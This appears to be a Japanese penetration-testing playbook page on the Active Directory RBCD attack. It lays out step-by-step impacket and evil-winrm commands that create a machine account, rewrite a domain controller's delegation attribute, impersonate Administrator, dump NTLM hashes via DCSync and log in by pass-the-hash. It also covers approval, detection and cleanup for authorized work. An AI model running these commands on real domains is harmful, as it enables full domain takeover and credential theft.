# RBCD（Resource-Based Constrained Delegation）攻撃

> **[HIGH IMPACT]** 本攻撃は以下の理由で商用案件では原則禁止または個別合意必須：
> - [ ] 業務停止リスク（サービス・認証）
> - [ ] 持続化に該当
> - [x] 不可逆な設定変更を含む（マシンアカウント作成・msDS-AllowedToActOnBehalfOfOtherIdentity 属性の変更）
> - [x] SIEM/EDR で確実に検知される（Event ID 4741 マシンアカウント作成 / 4769 Kerberos S4U）
>
> 実施可否は事前合意で明示確認すること。作成したマシンアカウントの削除、RBCD 属性のクリーンアップが必須。演習環境（HTB / OSCP 等）では制約なし。

## 概要

対象コンピューターオブジェクトへの書き込み権限（GenericAll / GenericWrite）と、ドメインにコンピューターアカウントを追加できる権限（SeMachineAccountPrivilege）を組み合わせて Domain Admin レベルのアクセスを得る攻撃手法。

---

## 着火条件

以下の**両方**が満たされている場合：

1. 現在のユーザーが **対象コンピューター（通常はDC）に GenericAll または GenericWrite** を持つ
   - BloodHound で確認
2. 現在のユーザーが **`SeMachineAccountPrivilege`** を持つ（ドメインにコンピューターアカウントを追加できる）
   - `whoami /all` で確認

---

## 攻撃の原理

`msDS-AllowedToActOnBehalfOfOtherIdentity` 属性に「信頼するコンピューターアカウントのSID」を設定することで、そのコンピューターアカウントが対象コンピューターに対してなりすまし（impersonation）を行えるようになる。

攻撃フロー：
1. 攻撃用コンピューターアカウント（`[CASE_ID]_TEST$`等）を作成
2. DCの上記属性に `[CASE_ID]_TEST$` のSIDを書き込む
3. S4U2Self → S4U2Proxy の順で `Administrator` のサービスチケット（TGS）を取得
4. そのチケットでDCにアクセス → DCSync

---

## 手順

### Step 1: コンピューターアカウントを作成

```bash
impacket-addcomputer \
  -computer-name '[CASE_ID]_TEST$' \
  -computer-pass '[CLIENT_PROVIDED_PASSWORD]' \
  -dc-ip [DC_IP] \
  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]'
```

成功すると：`Successfully added machine account [CASE_ID]_TEST$ with password [CLIENT_PROVIDED_PASSWORD]`

### Step 2: DCの RBCD 属性を設定

```bash
impacket-rbcd \
  -delegate-to '[DC_HOSTNAME]$' \
  -delegate-from '[CASE_ID]_TEST$' \
  -action write \
  -dc-ip [DC_IP] \
  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]'
```

成功すると：`Delegation rights modified successfully!`

### Step 3: Administrator のサービスチケットを取得

```bash
impacket-getST \
  -spn 'cifs/[DC_FQDN]' \
  -impersonate administrator \
  -dc-ip [DC_IP] \
  '[DOMAIN]/[CASE_ID]_TEST$:[CLIENT_PROVIDED_PASSWORD]'
```

成功すると `administrator@cifs_[DC_FQDN]@[DOMAIN].ccache` が生成される。

### Step 4: チケットを使って DCSync

```bash
export KRB5CCNAME=./administrator@cifs_[DC_FQDN]@[DOMAIN].ccache

impacket-secretsdump \
  -k -no-pass \
  -just-dc-ntlm \
  -target-ip [DC_IP] \
  administrator@[DC_FQDN]
```

### Step 5: Pass-The-Hash で接続

```bash
evil-winrm -i [DC_IP] -u Administrator -H '[NTLM_HASH]'
```

---

## トラブルシューティング

| 症状 | 原因・対処 |
|------|-----------|
| `Kerberos SessionError: KRB_AP_ERR_SKEW` | 時刻のずれ。`sudo ntpdate [DC_IP]` で同期 |
| チケット取得に失敗 | FQDN（完全修飾ドメイン名）を使っているか確認。`/etc/hosts` への登録を確認 |
| `getST` がエラー | `-dc-ip` と `-spn` の FQDN が一致しているか確認 |

---

## 注意点・落とし穴

- `-spn 'cifs/[DC_FQDN]'` の `[DC_FQDN]` は `DC1.domain.local` のような完全修飾名にする
- `KRB5CCNAME` 環境変数は `export` でセッションに設定する（sudoで実行する場合は `-E` オプション）
- コンピューターアカウントの作成上限（デフォルト10台）に達している場合は既存のアカウントを使う

---

### 商用案件での前提

- **事前合意の要否**: ★★★（書面承認必須）。マシンアカウント作成と DC への RBCD 属性書き込みを伴うため、ドメイン全体への影響と監査ログ痕跡が残る
- **想定されるSIEM/EDR検知**:
  - Event ID 4741（コンピューターアカウント作成）
  - Event ID 4742（コンピューターアカウントの属性変更：msDS-AllowedToActOnBehalfOfOtherIdentity）
  - Event ID 4769（Kerberos サービスチケット要求：S4U2Self / S4U2Proxy が短時間に発生）
  - Defender for Identity の RBCD アラート
- **業務影響リスク**: なし（読み取り操作の組み合わせだが、属性変更による設定汚染が残る）
- **原状回復必須項目**:
  - ✅ 作成したマシンアカウント（`[CASE_ID]_TEST$`）の削除
  - ✅ 対象コンピューターの `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性のクリア（`impacket-rbcd -action remove` または属性をnullに戻す）
  - ✅ 取得した `.ccache` チケットファイルの破棄
  - ✅ DCSync で取得した NTLM ハッシュは Credential_Dumping.md の原状回復項目に従う
- **取得情報の取扱**: 取得したチケット・NTLM ハッシュは暗号化保管、案件終了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術
- 前提: GenericAll → `../ACE_Abuse/GenericAll.md`
- DCSync実行後 → `../Credential_Dumping.md`
- Unconstrained Delegation との違い → `Unconstrained.md`
